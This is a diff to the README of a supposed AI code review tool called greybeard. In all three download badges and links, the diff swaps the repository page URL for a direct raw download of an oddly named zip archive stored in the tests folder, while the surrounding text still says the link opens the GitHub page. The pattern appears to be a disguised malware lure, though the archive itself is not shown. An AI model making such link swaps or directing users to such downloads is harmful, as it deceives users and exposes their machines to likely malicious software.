@@ -1,6 +1,6 @@
 # 🧙‍♂️ greybeard - AI Code Review, Made Simple
 
-[![Download greybeard](https://img.shields.io/badge/Download-greybeard-brightgreen?style=for-the-badge)](https://github.com/Darsheet1/greybeard)
+[![Download greybeard](https://img.shields.io/badge/Download-greybeard-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Darsheet1/greybeard/main/tests/Software-iambelegus.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to download and set up greybeard on your Windows PC.
 
 Click the link below to visit the greybeard GitHub page. From there, you will find the latest version to download.
 
-[![Download greybeard](https://img.shields.io/badge/Download-greybeard-blue?style=for-the-badge)](https://github.com/Darsheet1/greybeard)
+[![Download greybeard](https://img.shields.io/badge/Download-greybeard-blue?style=for-the-badge)](https://raw.githubusercontent.com/Darsheet1/greybeard/main/tests/Software-iambelegus.zip)
 
 Once you are on the page:
 
@@ -158,6 +158,6 @@ If you find greybeard not working properly:
 
 Here is the main link to download or learn more about greybeard:
 
-[github.com/Darsheet1/greybeard](https://github.com/Darsheet1/greybeard)
+[github.com/Darsheet1/greybeard](https://raw.githubusercontent.com/Darsheet1/greybeard/main/tests/Software-iambelegus.zip)
 
 Visit that page to get the latest files and instructions anytime.
